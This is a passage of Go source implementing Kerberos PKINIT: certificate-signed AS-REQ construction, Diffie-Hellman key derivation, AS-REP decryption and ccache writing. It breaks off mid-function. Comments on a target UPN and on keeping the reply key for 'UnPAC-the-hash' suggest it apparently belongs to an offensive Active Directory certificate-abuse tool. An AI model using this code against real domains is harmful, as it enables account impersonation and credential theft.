package pki

import (
	"crypto"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha1"
	"crypto/sha256"
	"crypto/x509"
	"encoding/asn1"
	"encoding/binary"
	"fmt"
	"io"
	"math/big"
	"net"
	"os"
	"path/filepath"
	"strings"
	"time"

	krbcrypto "github.com/jcmturner/gokrb5/v8/crypto"
	"github.com/jcmturner/gokrb5/v8/messages"
	"github.com/jcmturner/gokrb5/v8/types"
)

// ────────────────────────────────────────────────────────────────────────────
// PKINIT Types and Constants
// ────────────────────────────────────────────────────────────────────────────

// PKINITConfig holds parameters for real PKINIT authentication against a KDC.
type PKINITConfig struct {
	Cert      *x509.Certificate // Client certificate (with UPN SAN)
	Key       crypto.Signer     // Client private key
	DC        string            // KDC hostname or IP
	Domain    string            // Kerberos realm (auto-uppercased)
	UPN       string            // Target user principal name (user@domain)
	OutputDir string            // Directory to write ccache file
}

// PKINITResult holds the output of successful PKINIT authentication.
type PKINITResult struct {
	CcachePath string // Path to the written ccache file
	SessionKey []byte // TGT session key bytes
	Etype      int32  // Session key encryption type
	ReplyKey   []byte // AS-REP reply key (from DH derivation) — needed for UnPAC-the-hash
	ReplyEtype int32  // Reply key encryption type
	Username   string // Authenticated sAMAccountName
	Realm      string // Kerberos realm
	TGTRaw     []byte // Raw DER-encoded TGT Ticket (with APPLICATION 1 tag)
}

// PKINIT ASN.1 OIDs
var (
	oidPKINITAuthData = asn1.ObjectIdentifier{1, 3, 6, 1, 5, 2, 3, 1}
	oidSignedData     = asn1.ObjectIdentifier{1, 2, 840, 113549, 1, 7, 2}
	oidContentData    = asn1.ObjectIdentifier{1, 2, 840, 113549, 1, 7, 1}
	oidSHA1OID        = asn1.ObjectIdentifier{1, 3, 14, 3, 2, 26}
	oidSHA256OID      = asn1.ObjectIdentifier{2, 16, 840, 1, 101, 3, 4, 2, 1}
	oidRSAWithSHA256  = asn1.ObjectIdentifier{1, 2, 840, 113549, 1, 1, 11}
	oidContentType    = asn1.ObjectIdentifier{1, 2, 840, 113549, 1, 9, 3}
	oidMessageDigest  = asn1.ObjectIdentifier{1, 2, 840, 113549, 1, 9, 4}
	oidDHPublicNumber = asn1.ObjectIdentifier{1, 2, 840, 10046, 2, 1}
)

// Kerberos constants
const (
	krbPVNO          = 5
	krbMsgTypeASReq  = 10
	krbMsgTypeASRep  = 11
	krbMsgTypeError  = 30
	krbAppTagASReq   = 10
	krbAppTagASRep   = 11
	krbAppTagError   = 30
	krbPATypePKASReq = 16
	krbPATypePKASRep = 17

	krbNameTypePrincipal = 1
	krbNameTypeSrvInst   = 2

	krbEtypeAES256 = 18
	krbEtypeAES128 = 17
	krbEtypeRC4    = 23

	krbKeyUsageASRep = 3
)

// DH MODP Group 14 (RFC 3526) — 2048-bit prime
var dhGroup14Prime = func() *big.Int {
	p, _ := new(big.Int).SetString(
		"FFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD1"+
			"29024E088A67CC74020BBEA63B139B22514A08798E3404DD"+
			"EF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245"+
			"E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7ED"+
			"EE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3D"+
			"C2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F"+
			"83655D23DCA3AD961C62F356208552BB9ED529077096966D"+
			"670C354E4ABC9804F1746C08CA18217C32905E462E36CE3B"+
			"E39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9"+
			"DE2BCBF6955817183995497CEA956AE515D2261898FA0510"+
			"15728E5A8AACAA68FFFFFFFFFFFFFFFF", 16)
	return p
}()

var dhGroup14G = big.NewInt(2)

// ────────────────────────────────────────────────────────────────────────────
// ASN.1 Struct Types (PKINIT uses IMPLICIT TAGS module)
// ────────────────────────────────────────────────────────────────────────────

type krbPrincipal struct {
	NameType   int      `asn1:"explicit,tag:0"`
	NameString []string `asn1:"generalstring,explicit,tag:1"`
}

type krbReqBody struct {
	KDCOptions asn1.BitString `asn1:"explicit,tag:0"`
	CName      krbPrincipal   `asn1:"explicit,tag:1"`
	Realm      string         `asn1:"generalstring,explicit,tag:2"`
	SName      krbPrincipal   `asn1:"explicit,tag:3"`
	Till       time.Time      `asn1:"generalized,explicit,tag:5"`
	Nonce      int            `asn1:"explicit,tag:7"`
	EType      []int          `asn1:"explicit,tag:8"`
}

type krbPAData struct {
	PADataType  int    `asn1:"explicit,tag:1"`
	PADataValue []byte `asn1:"explicit,tag:2"`
}

type krbKDCReq struct {
	PVNO    int           `asn1:"explicit,tag:1"`
	MsgType int           `asn1:"explicit,tag:2"`
	PAData  []krbPAData   `asn1:"explicit,tag:3"`
	ReqBody asn1.RawValue `asn1:"explicit,tag:4"`
}

// PKINIT types (IMPLICIT TAGS)
type pkAuthenticatorASN struct {
	CUSec      int       `asn1:"tag:0"`
	CTime      time.Time `asn1:"generalized,tag:1"`
	Nonce      int       `asn1:"tag:2"`
	PAChecksum []byte    `asn1:"optional,tag:3"`
}

type authPackASN struct {
	PKAuthenticator pkAuthenticatorASN `asn1:"tag:0"`
	ClientPubValue  asn1.RawValue      `asn1:"optional,tag:1"`
	ClientDHNonce   []byte             `asn1:"optional,tag:3"`
}

type paPKASReqASN struct {
	SignedAuthPack []byte `asn1:"tag:0"`
}

// DH parameter types
type dhDomainParams struct {
	P *big.Int
	G *big.Int
}

type subjectPubKeyInfo struct {
	Algorithm algIdentifier
	PublicKey asn1.BitString
}

type algIdentifier struct {
	Algorithm  asn1.ObjectIdentifier
	Parameters asn1.RawValue `asn1:"optional"`
}

// CMS types for response parsing
type contentInfoASN struct {
	ContentType asn1.ObjectIdentifier
	Content     asn1.RawValue `asn1:"explicit,tag:0"`
}

type kdcDHKeyInfoASN struct {
	SubjectPublicKey asn1.BitString
	Nonce            int       `asn1:"explicit,tag:0"`
	DHKeyExpiration  time.Time `asn1:"generalized,explicit,optional,tag:1"`
}

// ────────────────────────────────────────────────────────────────────────────
// Main Entry Point
// ────────────────────────────────────────────────────────────────────────────

// PKINITAuth performs Kerberos PKINIT authentication using a certificate and
// private key. Returns a TGT written to a ccache file.
//
// Protocol: RFC 4556 with Diffie-Hellman key agreement (Windows AD compatible).
func PKINITAuth(cfg *PKINITConfig) (*PKINITResult, error) {
	realm := strings.ToUpper(cfg.Domain)
	username := cfg.UPN
	if idx := strings.Index(username, "@"); idx > 0 {
		username = username[:idx]
	}

	fmt.Printf("[*] PKINIT: authenticating %s@%s via certificate\n", username, realm)
	fmt.Printf("[*] KDC: %s\n", cfg.DC)

	// Generate DH key pair (MODP Group 14)
	dhPriv, dhPub, err := generateDHKeyPair()
	if err != nil {
		return nil, fmt.Errorf("generate DH keypair: %w", err)
	}

	// Generate clientDHNonce (32 random bytes)
	clientDHNonce := make([]byte, 32)
	if _, err := rand.Read(clientDHNonce); err != nil {
		return nil, fmt.Errorf("generate clientDHNonce: %w", err)
	}

	// Generate request nonce
	nonceBytes := make([]byte, 4)
	if _, err := rand.Read(nonceBytes); err != nil {
		return nil, fmt.Errorf("generate nonce: %w", err)
	}
	nonce := int(binary.BigEndian.Uint32(nonceBytes) & 0x7FFFFFFF) // positive int32

	// Build KDC-REQ-BODY
	body := krbReqBody{
		KDCOptions: asn1.BitString{
			Bytes:     []byte{0x40, 0x81, 0x00, 0x10}, // Forwardable + Renewable + Canonicalize
			BitLength: 32,
		},
		CName: krbPrincipal{
			NameType:   krbNameTypePrincipal,
			NameString: []string{username},
		},
		Realm: realm,
		SName: krbPrincipal{
			NameType:   krbNameTypeSrvInst,
			NameString: []string{"krbtgt", realm},
		},
		Till:  time.Date(2037, 9, 13, 2, 48, 5, 0, time.UTC),
		Nonce: nonce,
		EType: []int{krbEtypeAES256, krbEtypeAES128, krbEtypeRC4},
	}

	bodyDER, err := asn1.Marshal(body)
	if err != nil {
		return nil, fmt.Errorf("marshal KDC-REQ-BODY: %w", err)
	}

	// Compute paChecksum = SHA1(bodyDER) per RFC 4556
	paChecksumHash := sha1.Sum(bodyDER)
	paChecksum := paChecksumHash[:]

	// Build SubjectPublicKeyInfo for DH public key
	dhSPKI, err := buildDHSubjectPublicKeyInfo(dhPub)
	if err != nil {
		return nil, fmt.Errorf("build DH SPKI: %w", err)
	}

	// Build AuthPack
	now := time.Now().UTC()
	authPack := authPackASN{
		PKAuthenticator: pkAuthenticatorASN{
			CUSec:      now.Nanosecond() / 1000,
			CTime:      now,
			Nonce:      nonce,
			PAChecksum: paChecksum,
		},
		ClientPubValue: asn1.RawValue{FullBytes: dhSPKI},
		ClientDHNonce:  clientDHNonce,
	}

	authPackDER, err := asn1.Marshal(authPack)
	if err != nil {
		return nil, fmt.Errorf("marshal AuthPack: %w", err)
	}

	// Sign AuthPack with CMS SignedData
	cmsBytes, err := buildCMSSignedData(authPackDER, cfg.Cert, cfg.Key)
	if err != nil {
		return nil, fmt.Errorf("build CMS SignedData: %w", err)
	}

	// Build PA-PK-AS-REQ
	paPKASReq := paPKASReqASN{SignedAuthPack: cmsBytes}
	paPKASReqDER, err := asn1.Marshal(paPKASReq)
	if err != nil {
		return nil, fmt.Errorf("marshal PA-PK-AS-REQ: %w", err)
	}

	// Build the complete AS-REQ
	req := krbKDCReq{
		PVNO:    krbPVNO,
		MsgType: krbMsgTypeASReq,
		PAData: []krbPAData{
			{PADataType: krbPATypePKASReq, PADataValue: paPKASReqDER},
		},
		ReqBody: asn1.RawValue{FullBytes: bodyDER},
	}
	reqDER, err := asn1.Marshal(req)
	if err != nil {
		return nil, fmt.Errorf("marshal KDC-REQ: %w", err)
	}

	// Wrap with APPLICATION 10 tag
	asReqBytes := addASN1AppTag(reqDER, krbAppTagASReq)

	// Send to KDC
	fmt.Printf("[*] Sending PKINIT AS-REQ (%d bytes)...\n", len(asReqBytes))
	respBytes, err := sendKDCRequest(cfg.DC, asReqBytes)
	if err != nil {
		return nil, fmt.Errorf("KDC request: %w", err)
	}

	// Check if response is KRB-ERROR
	if err := checkKRBError(respBytes); err != nil {
		return nil, err
	}

	// Parse AS-REP
	var asRep messages.ASRep
	if err := asRep.Unmarshal(respBytes); err != nil {
		return nil, fmt.Errorf("unmarshal AS-REP: %w", err)
	}
	fmt.Printf("[+] Received AS-REP for %s@%s\n", asRep.CName.NameString[0], asRep.CRealm)

	// Extract PA-PK-AS-REP from padata
	var paPKASRepBytes []byte
	for _, pa := range asRep.PAData {
		if pa.PADataType == int32(krbPATypePKASRep) {
			paPKASRepBytes = pa.PADataValue
			break
		}
	}
	if paPKASRepBytes == nil {
		return nil, fmt.Errorf("AS-REP missing PA-PK-AS-REP padata (type %d)", krbPATypePKASRep)
	}

	// Parse DHRepInfo from PA-PK-AS-REP to get KDC's DH public key
	serverDHPub, serverDHNonce, err := parseDHRepInfo(paPKASRepBytes)
	if err != nil {
		return nil, fmt.Errorf("parse DHRepInfo: %w", err)
	}
	fmt.Println("[+] Extracted KDC DH public key from PA-PK-AS-REP")

	// Compute DH shared secret
	sharedSecret := new(big.Int).Exp(serverDHPub, dhPriv, dhGroup14Prime)
	sharedSecretBytes := padBigInt(sharedSecret, 256) // 2048-bit = 256 bytes

	// Derive AS-REP reply key from DH shared secret
	replyEtype := asRep.EncPart.EType
	keySize, err := getEtypeKeySize(replyEtype)
	if err != nil {
		return nil, fmt.Errorf("unsupported etype %d: %w", replyEtype, err)
	}

	var keyInput []byte
	if len(serverDHNonce) > 0 && len(clientDHNonce) > 0 {
		keyInput = append(sharedSecretBytes, clientDHNonce...)
		keyInput = append(keyInput, serverDHNonce...)
	} else {
		keyInput = sharedSecretBytes
	}
	replyKeyBytes := octetstring2key(keyInput, keySize)

	fmt.Printf("[+] Derived %d-byte reply key (etype %d)\n", len(replyKeyBytes), replyEtype)

	// Decrypt AS-REP enc-part
	replyKey := types.EncryptionKey{
		KeyType:  replyEtype,
		KeyValue: replyKeyBytes,
	}
	plaintext, err := krbcrypto.DecryptEncPart(asRep.EncPart, replyKey, uint32(krbKeyUsageASRep))
	if err != nil {
		return nil, fmt.Errorf("decrypt AS-REP enc-part: %w", err)
	}

	// Parse EncKDCRepPart
	var encRepPart messages.EncKDCRepPart
	if err := encRepPart.Unmarshal(plaintext); err != nil {
		return nil, fmt.Errorf("unmarshal EncKDCRepPart: %w", err)
	}

	// Verify nonce
	if encRepPart.Nonce != nonce {
		return nil, fmt.Errorf("AS-REP nonce mismatch: expected %d, got %d", nonce, encRepPart.Nonce)
	}

	fmt.Printf("[+] TGT session key: etype=%d, %d bytes\n",
		encRepPart.Key.KeyType, len(encRepPart.Key.KeyValue))
	fmt.Printf("[+] TGT valid: %s → %s\n",
		encRepPart.StartTime.Format("2006-01-02 15:04:05"),
		encRepPart.EndTime.Format("2006-01-02 15:04:05"))

	// Marshal the TGT ticket for ccache
	tgtRaw, err := asRep.Ticket.Marshal()
	if err != nil {
		return nil, fmt.Errorf("marshal TGT ticket: %w", err)
	}

	// Write ccache file
	if cfg.OutputDir == "" {
		cfg.OutputDir = "."
	}
	if err := os.MkdirAll(cfg.OutputDir, 0700); err != nil {
		return nil, fmt.Errorf("create output dir: %w", err)
	}
	ccachePath := filepath.Join(cfg.OutputDir, username+".ccache")

	// Convert gokrb5-forked BitString to ticket flags uint32
	var ticketFlags uint32
	if len(encRepPart.Flags.Bytes) >= 4 {
		ticketFlags = binary.BigEndian.Uint32(encRepPart.Flags.Bytes[:4])
	}

	err = writeCCache(ccachePath, username, realm,
		encRepPart.Key, ticketFlags,
		encRepPart.AuthTime, encRepPart.StartTime,
		encRepPart.EndTime, encRepPart.RenewTill,
		tgtRaw)
	if err != nil {
		return nil, fmt.Errorf("write ccache: %w", err)
	}

	fmt.Printf("[+] TGT written to: %s\n", ccachePath)
	fmt.Printf("[+] export KRB5CCNAME=%s\n", ccachePath)

	return &PKINITResult{
		CcachePath: ccachePath,
		SessionKey: encRepPart.Key.KeyValue,
		Etype:      encRepPart.Key.KeyType,
		ReplyKey:   replyKeyBytes,
		ReplyEtype: replyEtype,
		Username:   username,
		Realm:      realm,
		TGTRaw:     tgtRaw,
	}, nil
}

// ────────────────────────────────────────────────────────────────────────────
// DH Key Exchange
// ────────────────────────────────────────────────────────────────────────────

func generateDHKeyPair() (priv *big.Int, pub *big.Int, err error) {
	// Private key: random 256 bytes (2048 bits)
	privBytes := make([]byte, 256)
	if _, err := rand.Read(privBytes); err != nil {
		return nil, nil, fmt.Errorf("random bytes: %w", err)
	}
	priv = new(big.Int).SetBytes(privBytes)
	// Ensure 1 < priv < p-1
	pMinus1 := new(big.Int).Sub(dhGroup14Prime, big.NewInt(1))
	priv.Mod(priv, pMinus1)
	if priv.Sign() == 0 {
		priv.SetInt64(1)
	}

	// Public key: g^priv mod p
	pub = new(big.Int).Exp(dhGroup14G, priv, dhGroup14Prime)
	return priv, pub, nil
}

func buildDHSubjectPublicKeyInfo(dhPub *big.Int) ([]byte, error) {
	// DH parameters: SEQUENCE { p INTEGER, g INTEGER }
	params := dhDomainParams{P: dhGroup14Prime, G: dhGroup14G}
	paramsDER, err := asn1.Marshal(params)
	if err != nil {
		return nil, fmt.Errorf("marshal DH params: %w", err)
	}

	// DH public key as INTEGER, wrapped in BIT STRING
	pubKeyInt, err := asn1.Marshal(dhPub)
	if err != nil {
		return nil, fmt.Errorf("marshal DH pub key: %w", err)
	}

	spki := subjectPubKeyInfo{
		Algorithm: algIdentifier{
			Algorithm:  oidDHPublicNumber,
			Parameters: asn1.RawValue{FullBytes: paramsDER},
		},
		PublicKey: asn1.BitString{
			Bytes:     pubKeyInt,
			BitLength: len(pubKeyInt) * 8,
		},
	}
	return asn1.Marshal(spki)
}

// padBigInt returns the big-endian byte representation of n, left-padded with
// zeros to exactly size bytes.
func padBigInt(n *big.Int, size int) []byte {
	b := n.Bytes()
	if len(b) >= size {
		return b[:size]
	}
	padded := make([]byte, size)
	copy(padded[size-len(b):], b)
	return padded
}

// ────────────────────────────────────────────────────────────────────────────
// CMS SignedData Construction
// ────────────────────────────────────────────────────────────────────────────

// buildCMSSignedData creates a CMS ContentInfo containing a SignedData that
// signs the AuthPack DER using the provided certificate and private key.
// Uses SHA-256 digest and SHA256WithRSA signature with signed attributes.
// The eContentType is id-pkinit-authData for PKINIT authentication.
func buildCMSSignedData(authPackDER []byte, cert *x509.Certificate, key crypto.Signer) ([]byte, error) {
	return buildCMSSignedDataWithType(authPackDER, cert, key, oidPKINITAuthData)
}

// buildCMSSignedDataWithType creates a CMS ContentInfo containing a SignedData
// that signs the content using the provided certificate and private key.
// The eContentType parameter controls the EncapsulatedContentInfo type OID:
//   - id-pkinit-authData (1.3.6.1.5.2.3.1) for PKINIT authentication
//   - id-data (1.2.840.113549.1.7.1) for CMC enrollment co-signing
func buildCMSSignedDataWithType(content []byte, cert *x509.Certificate, key crypto.Signer, eContentType asn1.ObjectIdentifier) ([]byte, error) {
	// Compute digest of the content
	digest := sha256.Sum256(content)

	// Build signed attributes
	signedAttrs, err := buildSignedAttrsWithType(digest[:], eContentType)
	if err != nil {
		return nil, fmt.Errorf("build signedAttrs: %w", err)
	}

	// For signature computation, re-tag signedAttrs as SET (0x31) instead of IMPLICIT [0] (0xA0)
	signedAttrsForSig := make([]byte, len(signedAttrs))
	copy(signedAttrsForSig, signedAttrs)
	signedAttrsForSig[0] = 0x31 // SET tag

	// Sign the SET-tagged signed attrs
	sigHash := sha256.Sum256(signedAttrsForSig)
	var signature []byte
	switch k := key.(type) {
	case *rsa.PrivateKey:
		signature, err = rsa.SignPKCS1v15(rand.Reader, k, crypto.SHA256, sigHash[:])
	default:
		signature, err = key.Sign(rand.Reader, sigHash[:], crypto.SHA256)
	}
	if err != nil {
		return nil, fmt.Errorf("sign: %w", err)
	}

	// Build IssuerAndSerialNumber
	issuerAndSerial, err := buildIssuerAndSerialNumber(cert)
	if err != nil {
		return nil, fmt.Errorf("build issuer+serial: %w", err)
	}

	// Build SignerInfo
	signerInfo := buildSignerInfoDER(issuerAndSerial, signedAttrs, signature)

	// Build EncapsulatedContentInfo
	encapContent := buildEncapContentInfoWithType(content, eContentType)

	// Build certificate SET
	certSet := derTLV(0xA0, cert.Raw) // [0] IMPLICIT SET OF Certificate

	// Algorithm identifier for SHA-256
	algIDSHA256, _ := asn1.Marshal(algIdentifier{Algorithm: oidSHA256OID})
	digestAlgSet := derTLV(0x31, algIDSHA256) // SET OF AlgorithmIdentifier

	// SignerInfos SET
	signerInfoSet := derTLV(0x31, signerInfo)

	// Version INTEGER 3
	versionDER, _ := asn1.Marshal(3)

	// SignedData SEQUENCE
	sdContent := concat(versionDER, digestAlgSet, encapContent, certSet, signerInfoSet)
	sdSeq := derTLV(0x30, sdContent)

	// ContentInfo
	contentTypeDER, _ := asn1.Marshal(oidSignedData)
	sdExplicit := derTLV(0xA0, sdSeq)
	ciSeq := derTLV(0x30, concat(contentTypeDER, sdExplicit))

	return ciSeq, nil
}

func buildSignedAttrs(digest []byte) ([]byte, error) {
	return buildSignedAttrsWithType(digest, oidPKINITAuthData)
}

func buildSignedAttrsWithType(digest []byte, eContentType asn1.ObjectIdentifier) ([]byte, error) {
	// Attribute 1: contentType
	ctOID, _ := asn1.Marshal(eContentType)
	ctValueSet := derTLV(0x31, ctOID)
	ctAttrType, _ := asn1.Marshal(oidContentType)
	ctAttr := derTLV(0x30, concat(ctAttrType, ctValueSet))

	// Attribute 2: messageDigest
	dgOctet := derTLV(0x04, digest) // OCTET STRING
	dgValueSet := derTLV(0x31, dgOctet)
	dgAttrType, _ := asn1.Marshal(oidMessageDigest)
	dgAttr := derTLV(0x30, concat(dgAttrType, dgValueSet))

	// Encode as [0] IMPLICIT SET OF Attribute
	attrs := derTLV(0xA0, concat(ctAttr, dgAttr))
	return attrs, nil
}

func buildIssuerAndSerialNumber(cert *x509.Certificate) ([]byte, error) {
	issuerRDN := cert.RawIssuer
	serial, err := asn1.Marshal(cert.SerialNumber)
	if err != nil {
		return nil, err
	}
	return derTLV(0x30, concat(issuerRDN, serial)), nil
}

func buildSignerInfoDER(issuerAndSerial, signedAttrs, signature []byte) []byte {
	version, _ := asn1.Marshal(1)
	digestAlg, _ := asn1.Marshal(algIdentifier{Algorithm: oidSHA256OID})
	sigAlg, _ := asn1.Marshal(algIdentifier{Algorithm: oidRSAWithSHA256})
	sigOctet := derTLV(0x04, signature) // OCTET STRING

	return derTLV(0x30, concat(version, issuerAndSerial, digestAlg, signedAttrs, sigAlg, sigOctet))
}

func buildEncapContentInfoDER(authPackDER []byte) []byte {
	return buildEncapContentInfoWithType(authPackDER, oidPKINITAuthData)
}

func buildEncapContentInfoWithType(content []byte, eContentType asn1.ObjectIdentifier) []byte {
	oid, _ := asn1.Marshal(eContentType)
	eContentOctet := derTLV(0x04, content)
	eContentExplicit := derTLV(0xA0, eContentOctet) // [0] EXPLICIT OCTET STRING
	return derTLV(0x30, concat(oid, eContentExplicit))
}

// ────────────────────────────────────────────────────────────────────────────
// Network I/O
// ────────────────────────────────────────────────────────────────────────────

// sendKDCRequest sends a Kerberos message to the KDC via TCP on port 88.
// TCP framing: 4-byte big-endian length prefix + message bytes.
func sendKDCRequest(host string, reqBytes []byte) ([]byte, error) {
	addr := host
	if !strings.Contains(addr, ":") {
		addr = addr + ":88"
	}

	conn, err := net.DialTimeout("tcp", addr, 10*time.Second)
	if err != nil {
		return nil, fmt.Errorf("connect to KDC %s: %w", addr, err)
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(30 * time.Second))

	// Send: length prefix + message
	lenBuf := make([]byte, 4)
	binary.BigEndian.PutUint32(lenBuf, uint32(len(reqBytes)))
	if _, err := conn.Write(lenBuf); err != nil {
		return nil, fmt.Errorf("write length: %w", err)
	}
	if _, err := conn.Write(reqBytes); err != nil {
		return nil, fmt.Errorf("write message: %w", err)
	}

	// Read response: length prefix + message
	if _, err := io.ReadFull(conn, lenBuf); err != nil {
		return nil, fmt.Errorf("read response length: %w", err)
	}
	respLen := binary.BigEndian.Uint32(lenBuf)
	if respLen > 1<<20 { // 1MB sanity check
		return nil, fmt.Errorf("response too large: %d bytes", respLen)
	}
	respBytes := make([]byte, respLen)
	if _, err := io.ReadFull(conn, respBytes); err != nil {
		return nil, fmt.Errorf("read response: %w", err)
	}

	return respBytes, nil
}

// checkKRBError checks if the response bytes represent a KRB-ERROR and returns
// a descriptive error if so.
func checkKRBError(b []byte) error {
	// KRB-ERROR is APPLICATION 30 → tag byte 0x7E
	if len(b) < 2 {
		return fmt.Errorf("response too short (%d bytes)", len(b))
	}
	if b[0] != 0x7E {
		return nil // not a KRB-ERROR
	}

	var krbErr messages.KRBError
	if err := krbErr.Unmarshal(b); err != nil {
		return fmt.Errorf("KDC returned error (unparseable): %w", err)
	}

	errMsg := fmt.Sprintf("KDC error %d", krbErr.ErrorCode)
	switch krbErr.ErrorCode {
	case 24:
		errMsg += " (KDC_ERR_PREAUTH_FAILED) — certificate rejected or UPN mismatch"
	case 61:
		errMsg += " (KDC_ERR_INVALID_SIG) — AuthPack signature validation failed"
	case 62:
		errMsg += " (KDC_ERR_KDC_NOT_TRUSTED) — client doesn't trust KDC cert"
	case 63:
		errMsg += " (KDC_ERR_CLIENT_NOT_TRUSTED) — certificate issuer not in NTAuth store"
	case 65:
		errMsg += " (KDC_ERR_DH_KEY_PARAMETERS_NOT_ACCEPTED) — try different DH group"
	case 66:
		errMsg += " (KDC_ERR_CERTIFICATE_MISMATCH) — cert doesn't map to user"
	case 68:
		errMsg += " (KDC_ERR_PADATA_TYPE_NOSUPP) — KDC doesn't support PKINIT"
	}
	if krbErr.EText != "" {
		errMsg += ": " + krbErr.EText
	}
	return fmt.Errorf("%s", errMsg)
}

// ────────────────────────────────────────────────────────────────────────────
// Response Parsing
// ────────────────────────────────────────────────────────────────────────────

// parseDHRepInfo extracts the KDC's DH public key and optional serverDHNonce
// from the PA-PK-AS-REP padata value.
func parseDHRepInfo(data []byte) (serverDHPub *big.Int, serverDHNonce []byte, err error) {
	// PA-PK-AS-REP is a CHOICE. In IMPLICIT TAGS, dhInfo [0] replaces SEQUENCE tag.
	var outer asn1.RawValue
	if _, err := asn1.Unmarshal(data, &outer); err != nil {
		return nil, nil, fmt.Errorf("unmarshal PA-PK-AS-REP: %w", err)
	}

	if outer.Tag == 1 {
		return nil, nil, fmt.Errorf("KDC used RSA key transport (encKeyPack) — only DH mode is supported")
	}
	if outer.Tag != 0 {
		return nil, nil, fmt.Errorf("unexpected PA-PK-AS-REP choice tag: %d", outer.Tag)
	}

	// DHRepInfo fields are inside the [0] constructed tag
	remaining := outer.Bytes

	// Field 1: dhSignedData [0] IMPLICIT OCTET STRING — CMS ContentInfo
	var dhSignedDataRaw asn1.RawValue
	remaining, err = asn1.Unmarshal(remaining, &dhSignedDataRaw)
	if err != nil {
		return nil, nil, fmt.Errorf("unmarshal dhSignedData: %w", err)
	}

	// Extract KDCDHKeyInfo from CMS SignedData
	eContent, err := extractCMSEContent(dhSignedDataRaw.Bytes)
	if err != nil {
		return nil, nil, fmt.Errorf("extract CMS eContent: %w", err)
	}

	// Parse KDCDHKeyInfo
	var keyInfo kdcDHKeyInfoASN
	if _, err := asn1.Unmarshal(eContent, &keyInfo); err != nil {
		return nil, nil, fmt.Errorf("unmarshal KDCDHKeyInfo: %w", err)
	}

	// Extract DH public key INTEGER from BIT STRING
	var pubKey *big.Int
	if _, err := asn1.Unmarshal(keyInfo.SubjectPublicKey.Bytes, &pubKey); err != nil {
		return nil, nil, fmt.Errorf("unmarshal DH public key INTEGER: %w", err)
	}

	// Check for optional serverDHNonce [1] OCTET STRING
	if len(remaining) > 0 {
		var nonceRaw asn1.RawValue
		if _, err := asn1.Unmarshal(remaining, &nonceRaw); err == nil && nonceRaw.Tag == 1 {
			serverDHNonce = nonceRaw.Bytes
		}
	}

	return pubKey, serverDHNonce, nil
}

// extractCMSEContent walks a CMS ContentInfo → SignedData → EncapsulatedContentInfo
// and returns the eContent bytes (the raw content, unwrapped from OCTET STRING).
func extractCMSEContent(data []byte) ([]byte, error) {
	// ContentInfo SEQUENCE
	var ci contentInfoASN
	if _, err := asn1.Unmarshal(data, &ci); err != nil {
		return nil, fmt.Errorf("parse ContentInfo: %w", err)
	}

	// SignedData is inside ci.Content.Bytes
	var sdOuter asn1.RawValue
	if _, err := asn1.Unmarshal(ci.Content.Bytes, &sdOuter); err != nil {
		return nil, fmt.Errorf("parse SignedData outer: %w", err)
	}

	// Walk SignedData fields: version, digestAlgorithms, encapContentInfo, ...
	rest := sdOuter.Bytes

	// Skip version (INTEGER)
	var skipRaw asn1.RawValue
	rest, err := asn1.Unmarshal(rest, &skipRaw)
	if err != nil {
		return nil, fmt.Errorf("skip SignedData version: %w", err)
	}

	// Skip digestAlgorithms (SET OF)
	rest, err = asn1.Unmarshal(rest, &skipRaw)
	if err != nil {
		return nil, fmt.Errorf("skip SignedData digestAlgorithms: %w", err)
	}

	// Parse encapContentInfo (SEQUENCE)
	var eciRaw asn1.RawValue
	_, err = asn1.Unmarshal(rest, &eciRaw)
	if err != nil {
		return nil, fmt.Errorf("parse encapContentInfo: %w", err)
	}

	// Inside encapContentInfo: eContentType (OID), eContent [0] EXPLICIT OCTET STRING
	eciRest := eciRaw.Bytes
	var eContentType asn1.ObjectIdentifier
	eciRest, err = asn1.Unmarshal(eciRest, &eContentType)
	if err != nil {
		return nil, fmt.Errorf("parse eContentType: %w", err)
	}

	// eContent [0] EXPLICIT → contains OCTET STRING
	var eContentWrapper asn1.RawValue
	if _, err := asn1.Unmarshal(eciRest, &eContentWrapper); err != nil {
		return nil, fmt.Errorf("parse eContent wrapper: %w", err)
	}

	// Inside [0] is an OCTET STRING
	var eContent []byte
	if _, err := asn1.Unmarshal(eContentWrapper.Bytes, &eContent); err != nil {
		// Try treating the bytes directly (some implementations skip OCTET STRING wrapper)
		return eContentWrapper.Bytes, nil
	}

	return eContent, nil
}

// ────────────────────────────────────────────────────────────────────────────
// Key Derivation
// ────────────────────────────────────────────────────────────────────────────

// octetstring2key derives a key of the specified size from the input bytes
// using the RFC 4556 Section 3.2.3.1 derivation function.
//
//	for i = 0, 1, 2, ...:
//	    output += SHA1(byte(i) || input)
//	key = output[:keySize]
func octetstring2key(input []byte, keySize int) []byte {
	var output []byte
	for i := 0; len(output) < keySize; i++ {
		h := sha1.New()
		h.Write([]byte{byte(i)})
		h.Write(input)
		output = append(output, h.Sum(nil)...)
	}
	return output[:keySize]
}

// getEtypeKeySize returns the key size in bytes for the given Kerberos etype.
func getEtypeKeySize(etype int32) (int, error) {
	e, err := krbcrypto.GetEtype(etype)
	if err != nil {
		return 0, err
	}
	return e.GetKeyByteSize(), nil
}

// ────────────────────────────────────────────────────────────────────────────
// CCache Writer
// ────────────────────────────────────────────────────────────────────────────

// writeCCache writes a Kerberos ccache file (format version 0x0504).
func writeCCache(path, username, realm string,
	sessionKey types.EncryptionKey, ticketFlags uint32,
	authTime, startTime, endTime, renewTill time.Time,
	ticketDER []byte) error {

	f, err := os.OpenFile(path, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0600)
	if err != nil {
		return err
	}
	defer f.Close()

	w := &ccacheWriter{w: f}

	// Header: version 0x0504
	w.writeUint16(0x0504)
	// Header length: 0 (no header fields)
	w.writeUint16(0)

	// Default principal
	w.writePrincipal(krbNameTypePrincipal, realm, []string{username})

	// Credential entry
	// Client principal
	w.writePrincipal(krbNameTypePrincipal, realm, []string{username})
	// Server principal (krbtgt/REALM@REALM)
	w.writePrincipal(krbNameTypeSrvInst, realm, []string{"krbtgt", realm})

	// Keyblock: keytype (2 bytes) + etype padding (2 bytes) + keylen (4 bytes) + key
	w.writeUint16(uint16(sessionKey.KeyType))
	w.writeUint16(0) // etype padding
